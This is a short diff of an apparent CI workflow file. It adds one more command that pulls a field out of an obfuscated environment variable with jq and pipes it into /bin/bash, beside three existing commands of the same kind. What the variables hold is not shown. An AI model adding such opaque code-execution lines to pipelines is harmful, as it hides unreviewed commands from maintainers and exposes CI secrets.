@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$tla008" | jq -r .wzi9 | /bin/bash
           echo $tgar7911 | jq -r .z5 | /bin/bash
           echo $hs71472 | jq -r .bet8662 | /bin/bash
+          echo $in67886 | jq -r .eagu7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
